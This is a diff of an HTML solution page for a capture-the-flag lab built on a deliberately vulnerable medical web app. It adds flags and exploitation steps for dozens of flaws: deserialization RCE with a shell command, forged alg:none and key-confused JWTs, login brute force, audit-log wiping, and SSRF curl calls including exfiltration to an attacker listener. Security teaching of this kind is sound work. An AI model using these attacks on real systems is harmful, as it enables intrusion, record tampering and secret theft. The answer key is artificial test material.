+    <div class="card"><h3>Missing state machine — dispense <span class="badge b-med">MEDIUM</span><span class="fid">#59</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #59</span><span class="status ok">PLACED</span><div class="flag">flag{a06_missing_state_machine_dispense_90f714}</div><div class="how">Behavioral: <code>PUT /api/prescriptions/{id}/dispense</code> on an already-DISPENSED prescription (no state machine). Then <code>GET /api/ctf/behavior/a06-missing-state-machine-dispense</code>.</div></div>
       <p><b>Do</b> Double-dispense / dispense a voided prescription.</p>
       <p><b>Path</b> <code>PrescriptionService</code> allows any status transition; replay dispense → flag on the illegal second dispense.</p>
       <p><b>Code</b> <span class="ref">PrescriptionService</span></p></div>
 
-    <div class="card"><h3>Missing state machine — appointment <span class="badge b-easy">EASY</span><span class="fid">#43</span><span class="pts">100</span></h3>
+    <div class="card"><h3>Missing state machine — appointment <span class="badge b-easy">EASY</span><span class="fid">#43</span><span class="pts">100</span></h3><div class="ans"><span class="lbl">ANSWER #43</span><span class="status ok">PLACED</span><div class="flag">flag{a06_missing_state_machine_appointment_bdcdf6}</div><div class="how">Behavioral: <code>PUT /api/appointments/{id}/status {"status":"REQUESTED"}</code> on a COMPLETED appointment (impossible transition; no state machine). Then <code>GET /api/ctf/behavior/a06-missing-state-machine-appointment</code> returns the flag.</div></div>
       <p><b>Do</b> Move an appointment to an illegal status.</p>
       <p><b>Path</b> <code>PUT /api/appointments/{id}/status</code> accepts any transition (e.g. completed → pending). Flag on an impossible transition.</p>
       <p><b>Code</b> <span class="ref">AppointmentService</span></p>
       <p class="twist">● Distinct twist — different lifecycle/resource.</p></div>
 
-    <div class="card"><h3>Unbounded fan-out <span class="badge b-med">MEDIUM</span><span class="fid">#187</span><span class="pts">200</span></h3>
+    <div class="card"><h3>Unbounded fan-out <span class="badge b-med">MEDIUM</span><span class="fid">#187</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #187</span><span class="status ok">PLACED</span><div class="flag">flag{a06_unbounded_fan_out_bea554}</div><div class="how">Behavioral: <code>POST /api/admin/broadcast</code> with no <code>roles</code> fans out to every user (no cap). Then <code>GET /api/ctf/behavior/a06-unbounded-fan-out</code>.</div></div>
       <p><b>Do</b> Trigger an unbounded broadcast.</p>
       <p><b>Path</b> Broadcast has no recipient/size cap; a single call fans out to everyone. Flag on demonstrating the amplification.</p>
       <p><b>Code</b> <span class="ref">AdminBroadcastService#broadcast</span></p></div>
@@ -359,23 +392,23 @@
     <h2>A07 — Authentication Failures</h2>
     <p class="catmeta">Registration, login, and token validation that trust the client or leak signal.</p>
 
-    <div class="card"><h3>User enumeration <span class="badge b-easy">EASY</span><span class="fid">#25</span><span class="pts">100</span></h3>
+    <div class="card"><h3>User enumeration <span class="badge b-easy">EASY</span><span class="fid">#25</span><span class="pts">100</span></h3><div class="ans"><span class="lbl">ANSWER #25</span><span class="status ok">PLACED</span><div class="flag">flag{a07_user_enumeration_97360a}</div><div class="how">Login a real username with a wrong password: <code>POST /api/auth/login {"username":"patient1","password":"x"}</code>, then <code>GET /api/ctf/behavior/a07-user-enumeration</code>.</div></div>
       <p><b>Do</b> Discover valid accounts.</p>
       <p><b>Path</b> Distinct error messages on register/login reveal which usernames exist; enumerate to the target account (feeds #27).</p>
       <p><b>Code</b> <span class="ref">AuthService</span></p>
       <p class="shared">● Shared flag — with #35.</p></div>
 
-    <div class="card"><h3>No login rate limiting <span class="badge b-med">MEDIUM</span><span class="fid">#27</span><span class="pts">200</span></h3>
+    <div class="card"><h3>No login rate limiting <span class="badge b-med">MEDIUM</span><span class="fid">#27</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #27</span><span class="status ok">PLACED</span><div class="flag">flag{a07_no_login_rate_limiting_cc1b17}</div><div class="how">Fire 5+ failed logins for one account, then <code>GET /api/ctf/behavior/a07-no-login-rate-limiting</code>.</div></div>
       <p><b>Do</b> Brute-force a weak password.</p>
       <p><b>Path</b> <code>/api/auth/login</code> has no throttle/lockout; brute the enumerated account → flag on its dashboard.</p>
       <p><b>Code</b> <span class="ref">AuthService#login</span></p></div>
 
-    <div class="card"><h3>Expiry-skip path bypass <span class="badge b-hard">HARD</span><span class="fid">#33</span><span class="pts">300</span></h3>
+    <div class="card"><h3>Expiry-skip path bypass <span class="badge b-hard">HARD</span><span class="fid">#33</span><span class="pts">300</span></h3><div class="ans"><span class="lbl">ANSWER #33</span><span class="status ok">PLACED</span><div class="flag">flag{a07_expiry_skip_path_bypass_957f29}</div><div class="how">Present an EXPIRED HS256 token (hardcoded key) to <code>/api/reports/**</code>, then <code>GET /api/ctf/behavior/a07-expiry-skip-path-bypass</code>.</div></div>
       <p><b>Do</b> Use an expired token where expiry isn't checked.</p>
       <p><b>Path</b> SKIP_EXPIRY_PATHS accepts expired tokens on <code>/api/public|legacy|reports/</code>; present one → flag.</p>
       <p><b>Code</b> <span class="ref">JwtAuthenticationFilter</span></p></div>
 
-    <div class="card"><h3>Fail-open token validation <span class="badge b-hard">HARD</span><span class="fid">#34</span><span class="pts">300</span></h3>
+    <div class="card"><h3>Fail-open token validation <span class="badge b-hard">HARD</span><span class="fid">#34</span><span class="pts">300</span></h3><div class="ans"><span class="lbl">ANSWER #34</span><span class="status ok">PLACED</span><div class="flag">flag{a07_fail_open_token_validation_bdba1f}</div><div class="how">Send a request with <code>Authorization: Bearer not.a.validtoken</code>, then <code>GET /api/ctf/behavior/a07-fail-open-token-validation</code>.</div></div>
       <p><b>Do</b> Authenticate with a malformed/invalid token.</p>
       <p><b>Path</b> Token-parse exceptions are swallowed and the request proceeds authenticated; craft an invalid token → reach flag.</p>
       <p><b>Code</b> <span class="ref">JwtAuthenticationFilter</span></p></div>
@@ -386,41 +419,41 @@
     <h2>A08 — Software &amp; Data Integrity Failures</h2>
     <p class="catmeta">Trusting data/tokens without verifying integrity: unsafe deserialization, unverified JWTs, unsigned artifacts, silent tamper.</p>
 
-    <div class="card"><h3>Java deserialization RCE <span class="badge b-hard">HARD</span><span class="fid">#245</span><span class="pts">300</span></h3>
+    <div class="card"><h3>Java deserialization RCE <span class="badge b-hard">HARD</span><span class="fid">#245</span><span class="pts">300</span></h3><div class="ans"><span class="lbl">ANSWER #245</span><span class="status ok">PLACED</span><div class="flag">flag{a08_java_deserialization_rce_990dc2}</div><div class="how">Deserialization RCE: rebuild <code>com.mediconnect.dto.ReferralBundle</code> (serialVersionUID=1L, String fields), set <code>cmd='printenv CTF_A08_FLAG &gt; ctf-flags/a08.out'</code>, serialize+base64. <code>POST /api/doctor/referrals {bundlePayload}</code> then <code>GET /api/doctor/referrals/inbox</code> triggers readObject-&gt;exec. Read <code>ctf-flags/a08.out</code> via the path-traversal download. <b>Requires launching the app with CTF_A08_FLAG set.</b></div></div>
       <p><b>Do</b> Execute code via a serialized object.</p>
       <p><b>Path</b> The referral inbox base64-deserializes a <code>ReferralBundle</code> with no allow-list; send a gadget chain that reads the flag file.</p>
       <p><b>Code</b> <span class="ref">DoctorReferralService#decodeBundle</span></p></div>
 
-    <div class="card"><h3>alg:none JWT <span class="badge b-med">MEDIUM</span><span class="fid">#210</span><span class="pts">200</span></h3>
+    <div class="card"><h3>alg:none JWT <span class="badge b-med">MEDIUM</span><span class="fid">#210</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #210</span><span class="status ok">PLACED</span><div class="flag">flag{a08_alg_none_jwt_21cdfe}</div><div class="how">Behavioral: <code>POST /api/doctor/prescriptions/{id}/co-sign {"jwt":"&lt;header alg:none&gt;"}</code> - accepted with no signature check, forging any co-signer. Then <code>GET /api/ctf/behavior/a08-alg-none-jwt</code>.</div></div>
       <p><b>Do</b> Forge an unsigned token the server trusts.</p>
       <p><b>Path</b> <code>JwtNoneVerifier</code> accepts <code>alg:none</code>; co-sign as another identity → flag.</p>
       <p><b>Code</b> <span class="ref">JwtNoneVerifier</span></p>
       <p class="shared">● Shared flag — with #230.</p></div>
 
-    <div class="card"><h3>JWT algorithm confusion <span class="badge b-hard">HARD</span><span class="fid">#19</span><span class="pts">300</span></h3>
+    <div class="card"><h3>JWT algorithm confusion <span class="badge b-hard">HARD</span><span class="fid">#19</span><span class="pts">300</span></h3><div class="ans"><span class="lbl">ANSWER #19</span><span class="status ok">PLACED</span><div class="flag">flag{a08_jwt_algorithm_confusion_25c699}</div><div class="how">Co-sign with a token header <code>{"alg":"RS256"}</code>: <code>POST /api/doctor/prescriptions/1/co-sign {"jwt":"&lt;rs256-headed token&gt;"}</code>, then <code>GET /api/ctf/behavior/a08-jwt-algorithm-confusion</code>.</div></div>
       <p><b>Do</b> Exploit HS/RS key confusion.</p>
       <p><b>Path</b> Verifier can be tricked into using the public key as an HMAC secret; sign a forged token accordingly → flag.</p>
       <p><b>Code</b> <span class="ref">JwtUtil</span></p>
       <p class="twist">● Distinct twist — key-confusion vs none.</p></div>
 
-    <div class="card"><h3>Weak signing (MD5 + hardcoded key) <span class="badge b-med">MEDIUM</span><span class="fid">#225</span><span class="pts">200</span></h3>
+    <div class="card"><h3>Weak signing (MD5 + hardcoded key) <span class="badge b-med">MEDIUM</span><span class="fid">#225</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #225</span><span class="status ok">PLACED</span><div class="flag">flag{a08_weak_signing_md5_hardcoded_key_890733}</div><div class="how">Recompute <code>MD5(id:med:dosage:medi-sig-key-2024)</code> for tampered content, then <code>POST /api/doctor/prescriptions/1/verify-signature {"medicationName":..,"dosage":..,"signatureMd5":..}</code> and <code>GET /api/ctf/behavior/a08-weak-signing-md5-hardcoded-key</code>.</div></div>
       <p><b>Do</b> Forge a valid prescription signature.</p>
       <p><b>Path</b> <code>PrescriptionSigner</code> signs with MD5 + a hardcoded key; recompute a signature for tampered content → flag.</p>
       <p><b>Code</b> <span class="ref">PrescriptionSigner</span></p>
       <p class="shared">● Shared flag — with #216, #200 (handoff HMAC-SHA1, no expiry).</p></div>
 
-    <div class="card"><h3>Missing content hash / unsigned artifact <span class="badge b-easy">EASY</span><span class="fid">#50</span><span class="pts">100</span></h3>
+    <div class="card"><h3>Missing content hash / unsigned artifact <span class="badge b-easy">EASY</span><span class="fid">#50</span><span class="pts">100</span></h3><div class="ans"><span class="lbl">ANSWER #50</span><span class="status ok">PLACED</span><div class="flag">flag{a08_missing_content_hash_unsigned_artifact_137e88}</div><div class="how">Upload an attachment to a record twice (second call replaces the first): <code>POST /api/medical-records/{id}/attachment</code>, then <code>GET /api/ctf/behavior/a08-missing-content-hash-unsigned-artifact</code>.</div></div>
       <p><b>Do</b> Swap a file/PDF undetected.</p>
       <p><b>Path</b> Uploads/PDFs carry no <code>content_hash</code> or signature; replace the artifact and it's accepted. Flag confirms the integrity gap.</p>
       <p><b>Code</b> <span class="ref">MedicalRecordService</span> (fold #44/#227 PDFs)</p></div>
 
-    <div class="card"><h3>Clinical-value tamper (no amend) <span class="badge b-med">MEDIUM</span><span class="fid">#177</span><span class="pts">200</span></h3>
+    <div class="card"><h3>Clinical-value tamper (no amend) <span class="badge b-med">MEDIUM</span><span class="fid">#177</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #177</span><span class="status ok">PLACED</span><div class="flag">flag{a08_clinical_value_tamper_no_amend_3e8ba3}</div><div class="how">Behavioral: <code>POST /api/admin/lab-results/{id}/override-value {"resultValue":"..."}</code> mutates a clinical result with no amend flag / audit. Then <code>GET /api/ctf/behavior/a08-clinical-value-tamper-no-amend</code>.</div></div>
       <p><b>Do</b> Silently alter a lab result.</p>
       <p><b>Path</b> <code>overrideLabResultValue</code> mutates a result with no amend flag / audit; change it → flag on undetected mutation.</p>
       <p><b>Code</b> <span class="ref">AdminClinicalService#overrideLabResultValue</span></p>
       <p class="twist">● Distinct twist — clinical-record integrity.</p></div>
 
-    <div class="card"><h3>Overwrite-in-place (redact) <span class="badge b-med">MEDIUM</span><span class="fid">#188</span><span class="pts">200</span></h3>
+    <div class="card"><h3>Overwrite-in-place (redact) <span class="badge b-med">MEDIUM</span><span class="fid">#188</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #188</span><span class="status ok">PLACED</span><div class="flag">flag{a08_overwrite_in_place_redact_e04e41}</div><div class="how">Behavioral: <code>POST /api/admin/messages/{id}/redact</code> overwrites a non-empty message in place (original lost). Then <code>GET /api/ctf/behavior/a08-overwrite-in-place-redact</code>.</div></div>
       <p><b>Do</b> Destroy original content with no version history.</p>
       <p><b>Path</b> <code>AdminBroadcastService#redact</code> overwrites message content in place; the lost original is the finding. Flag on irreversible edit.</p>
       <p><b>Code</b> <span class="ref">AdminBroadcastService#redact</span></p></div>
@@ -431,18 +464,18 @@
     <h2>A09 — Logging &amp; Alerting Failures</h2>
     <p class="catmeta">Logs that leak secrets, and audit trails that can be tampered or left blind.</p>
 
-    <div class="card"><h3>Wipe the audit trail <span class="badge b-easy">EASY</span><span class="fid">#65</span><span class="pts">100</span></h3>
+    <div class="card"><h3>Wipe the audit trail <span class="badge b-easy">EASY</span><span class="fid">#65</span><span class="pts">100</span></h3><div class="ans"><span class="lbl">ANSWER #65</span><span class="status ok">PLACED</span><div class="flag">flag{a09_wipe_the_audit_trail_854c15}</div><div class="how">Behavioral: <code>POST /api/admin/logs/clear</code> wipes the audit trail. Then <code>GET /api/ctf/behavior/a09-wipe-the-audit-trail</code>. (Destructive; DB re-seed restores logs.)</div></div>
       <p><b>Do</b> Erase all evidence of an action.</p>
       <p><b>Path</b> Perform a seeded logged action, then <code>POST /api/admin/logs/clear</code>; the missing record yields the flag.</p>
       <p><b>Code</b> <span class="ref">AdminService /admin/logs/clear</span></p></div>
 
-    <div class="card"><h3>Selective log tampering <span class="badge b-med">MEDIUM</span><span class="fid">#160</span><span class="pts">200</span></h3>
+    <div class="card"><h3>Selective log tampering <span class="badge b-med">MEDIUM</span><span class="fid">#160</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #160</span><span class="status ok">PLACED</span><div class="flag">flag{a09_selective_log_tampering_a36ec7}</div><div class="how">Behavioral: <code>DELETE /api/admin/logs/{id}</code> selectively removes one record. Then <code>GET /api/ctf/behavior/a09-selective-log-tampering</code>.</div></div>
       <p><b>Do</b> Surgically delete one incriminating entry.</p>
       <p><b>Path</b> <code>DELETE /api/admin/logs/{id}</code> removes a single record — harder to notice than a wipe. Flag on the targeted deletion.</p>
       <p><b>Code</b> <span class="ref">AdminAuditService#deleteOne</span></p>
       <p class="twist">● Distinct twist — surgical vs wholesale.</p></div>
 
-    <div class="card"><h3>Silent no-audit on high-risk op <span class="badge b-med">MEDIUM</span><span class="fid">#201</span><span class="pts">200</span></h3>
+    <div class="card"><h3>Silent no-audit on high-risk op <span class="badge b-med">MEDIUM</span><span class="fid">#201</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #201</span><span class="status ok">PLACED</span><div class="flag">flag{a09_silent_no_audit_on_high_risk_op_2a0fbb}</div><div class="how">Behavioral: <code>POST /api/doctor/patients/{id}/handoff</code> issues a token with NO audit entry (absent record = the finding). Then <code>GET /api/ctf/behavior/a09-silent-no-audit-on-high-risk-op</code>.</div></div>
       <p><b>Do</b> Perform a sensitive op that leaves no trace.</p>
       <p><b>Path</b> Handoff issuance writes no audit entry; the absent log for a high-value action is the finding → flag.</p>
       <p><b>Code</b> <span class="ref">handoff issuance path</span></p>
@@ -454,40 +487,40 @@
     <h2>A10 — Mishandling of Exceptional Conditions (+ SSRF)</h2>
     <p class="catmeta">Fetching attacker-chosen URLs (SSRF) and fail-open / swallowed-error handling.</p>
 
-    <div class="card"><h3>SSRF — server fetches your URL <span class="badge b-easy">EASY</span><span class="fid">#220</span><span class="pts">100</span></h3>
+    <div class="card"><h3>SSRF — server fetches your URL <span class="badge b-easy">EASY</span><span class="fid">#220</span><span class="pts">100</span></h3><div class="ans"><span class="lbl">ANSWER #220</span><span class="status ok">PLACED</span><div class="flag">flag{a10_ssrf_server_fetches_your_url_c748b1}</div><div class="how">Reflected SSRF: <code>curl -H 'Authorization: Bearer &lt;t&gt;' -X POST http://localhost:8085/api/doctor/lab-orders -d '{"patientId":1,"doctorId":1,"customQueryUrl":"http://127.0.0.1:8099/internal/metadata"}'</code>. Flag = <code>internal_token</code> in <code>catalogueResponse</code>. (8099 404s on public 8085; unpublished in docker.)</div></div>
       <p><b>Do</b> Make the server reach an internal-only endpoint.</p>
       <p><b>Path</b> <code>DoctorLabService#importUrl</code> fetches a caller URL with no allow-list; point it at <code>http://localhost:8085/internal/ctf-metadata</code> → flag.</p>
       <p><b>Code</b> <span class="ref">ExternalCatalogueClient</span></p>
       <p class="shared">● Shared flag — same client in #214. (#229 shares this endpoint — see A03.)</p></div>
 
-    <div class="card"><h3>Blind SSRF via outbound POST <span class="badge b-hard">HARD</span><span class="fid">#228</span><span class="pts">300</span></h3>
+    <div class="card"><h3>Blind SSRF via outbound POST <span class="badge b-hard">HARD</span><span class="fid">#228</span><span class="pts">300</span></h3><div class="ans"><span class="lbl">ANSWER #228</span><span class="status ok">PLACED</span><div class="flag">flag{a10_blind_ssrf_via_outbound_post_a58824}</div><div class="how">Create a prescription with <code>pharmacyCallbackUrl</code> pointing at a listener you control; the server POSTs to it with header <code>X-Internal-Signing-Token</code> = the flag. Also <code>GET /api/ctf/behavior/a10-blind-ssrf-via-outbound-post</code>.</div></div>
       <p><b>Do</b> Exfiltrate via a server-initiated POST to your URL.</p>
       <p><b>Path</b> Prescription flow POSTs to a caller <code>pharmacyCallbackUrl</code>; capture the outbound request (with internal data) → flag.</p>
       <p><b>Code</b> <span class="ref">DoctorPrescribingService</span></p>
       <p class="twist">● Distinct twist — blind/outbound vs inbound-read SSRF.</p></div>
 
-    <div class="card"><h3>Fail-open promote on exception <span class="badge b-med">MEDIUM</span><span class="fid">#128</span><span class="pts">200</span></h3>
+    <div class="card"><h3>Fail-open promote on exception <span class="badge b-med">MEDIUM</span><span class="fid">#128</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #128</span><span class="status ok">PLACED</span><div class="flag">flag{a10_fail_open_promote_on_exception_486016}</div><div class="how">Behavioral: <code>POST /api/refills</code> with <code>quantity:null</code> (then <code>POST /api/refills/{id}/retry</code>) makes the validator throw and the refill is promoted READY (fail-open). Then <code>GET /api/ctf/behavior/a10-fail-open-promote-on-exception</code>.</div></div>
       <p><b>Do</b> Make a failed validation default to allow.</p>
       <p><b>Path</b> <code>RefillQueueService</code> promotes to READY on any validator exception (trigger via null <code>quantity</code>, #133/#134) → illegitimate dispense → flag.</p>
       <p><b>Code</b> <span class="ref">RefillQueueService</span></p></div>
 
-    <div class="card"><h3>TOCTOU race — double dispense <span class="badge b-hard">HARD</span><span class="fid">#131</span><span class="pts">300</span></h3>
+    <div class="card"><h3>TOCTOU race — double dispense <span class="badge b-hard">HARD</span><span class="fid">#131</span><span class="pts">300</span></h3><div class="ans"><span class="lbl">ANSWER #131</span><span class="status ok">PLACED</span><div class="flag">flag{a10_toctou_race_double_dispense_f86aac}</div><div class="how">Behavioral TOCTOU: fire <b>concurrent</b> <code>POST /api/refills/{id}/dispense</code> on a READY refill (sequential is blocked by the guard; only a race passes twice). Then <code>GET /api/ctf/behavior/a10-toctou-race-double-dispense</code>.</div></div>
       <p><b>Do</b> Win a check-then-act race.</p>
       <p><b>Path</b> <code>dispense</code> checks then acts without locking; fire concurrent requests to dispense twice → flag on the double.</p>
       <p><b>Code</b> <span class="ref">RefillQueueService#dispense</span></p></div>
 
-    <div class="card"><h3>Swallow-all in background worker <span class="badge b-med">MEDIUM</span><span class="fid">#130</span><span class="pts">200</span></h3>
+    <div class="card"><h3>Swallow-all in background worker <span class="badge b-med">MEDIUM</span><span class="fid">#130</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #130</span><span class="status ok">PLACED</span><div class="flag">flag{a10_swallow_all_in_background_worker_53a0ca}</div><div class="how">Enqueue <code>POST /api/refills {"requestedBy":-999,...}</code>; on the next worker tick (30s) the swallow-all fires. Then <code>GET /api/ctf/behavior/a10-swallow-all-in-background-worker</code>.</div></div>
       <p><b>Do</b> Hide a failure in a scheduled job.</p>
       <p><b>Path</b> <code>@Scheduled runWorker</code> catches every exception silently; drive it into a bad state that goes unreported → flag in that state.</p>
       <p><b>Code</b> <span class="ref">RefillQueueService (worker)</span></p></div>
 
-    <div class="card"><h3>Verbose exception leakage <span class="badge b-easy">EASY</span><span class="fid">#136</span><span class="pts">100</span></h3>
+    <div class="card"><h3>Verbose exception leakage <span class="badge b-easy">EASY</span><span class="fid">#136</span><span class="pts">100</span></h3><div class="ans"><span class="lbl">ANSWER #136</span><span class="status ok">PLACED</span><div class="flag">flag{a10_verbose_exception_leakage_90058f}</div><div class="how"><code>curl -s http://localhost:8085/api/refills -H 'Authorization: Bearer &lt;jwt&gt;'</code>. Flag embedded in the verbose <code>failureReason</code>.</div></div>
       <p><b>Do</b> Read internal detail from an error message.</p>
       <p><b>Path</b> <code>GET /api/refills</code> returns raw exception text in <code>failureReason</code>; trigger an error that leaks the flag/internal path.</p>
       <p><b>Code</b> <span class="ref">RefillQueueService</span></p>
       <p class="shared">● Shared flag — same leak class in #137, #159, #211, #223.</p></div>
 
-    <div class="card"><h3>Silent null on failed decode <span class="badge b-med">MEDIUM</span><span class="fid">#254</span><span class="pts">200</span></h3>
+    <div class="card"><h3>Silent null on failed decode <span class="badge b-med">MEDIUM</span><span class="fid">#254</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #254</span><span class="status ok">PLACED</span><div class="flag">flag{a10_silent_null_on_failed_decode_f31aaa}</div><div class="how">Behavioral: <code>POST /api/doctor/referrals {"bundlePayload":"QUJDREVGRw=="}</code> (non-empty but invalid), then <code>GET /api/doctor/referrals/inbox</code> triggers <code>decodeBundle()</code> which swallows the failure and returns null. Then <code>GET /api/ctf/behavior/a10-silent-null-on-failed-decode</code>.</div></div>
       <p><b>Do</b> Turn a masked failure into a downstream flaw.</p>
       <p><b>Path</b> <code>decodeBundle</code> returns <code>null</code> on failure instead of erroring; the unchecked null drives a downstream NPE/bypass that exposes the flag.</p>
       <p><b>Code</b> <span class="ref">DoctorReferralService#decodeBundle</span></p>
